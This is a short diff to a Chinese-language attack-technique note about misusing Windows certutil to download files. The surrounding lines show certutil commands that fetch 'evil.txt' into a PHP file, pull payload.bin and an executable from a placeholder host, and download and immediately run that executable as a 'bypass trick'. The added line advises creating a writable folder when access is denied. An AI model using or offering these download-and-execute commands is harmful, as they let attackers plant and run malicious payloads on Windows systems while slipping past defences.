@@ -121,6 +121,8 @@ certutil 用于备份证书服务，支持 xp-win10 都支持。由于 certutil 
 # 下载
 certutil -urlcache -split -f http://192.168.1.1/evil.txt test.php
 
+# 如果提示拒绝访问，可以在找一个能创建文件夹的目录，创建完之后下载到文件夹里
+
 # bypass技巧
 certutil & Certutil -urlcache -split -f  https://xxx.com/test/payload.bin payload.bin
 certutil & Certutil -urlcache -split -f  https://xxx.com/test/mian.exe mian.exe & mian.exe
